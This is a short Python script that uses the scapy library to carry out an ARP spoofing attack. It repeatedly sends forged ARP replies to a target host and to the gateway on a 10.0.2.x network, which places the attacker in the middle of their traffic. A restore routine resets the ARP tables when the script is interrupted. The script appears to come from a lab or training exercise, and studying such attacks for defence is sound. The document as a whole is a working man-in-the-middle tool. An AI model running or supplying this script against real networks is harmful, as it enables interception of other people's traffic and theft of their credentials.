import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answerad_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answerad_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore_spoof(distanation_ip, source_ip):
    distanation_mac = get_mac(distanation_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=distanation_ip, hwdst=distanation_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.0.2.23"
getway_ip = "10.0.2.1"

packet_send_count = 0
try:
    while True:
        spoof(target_ip, getway_ip)
        spoof(getway_ip, target_ip)
        packet_send_count += 2
        print("\r[+] Packet send: " + str(packet_send_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected Ctr + C  .... Resetting ARP packet...")
    restore_spoof("10.0.2.23", "10.0.2.1")
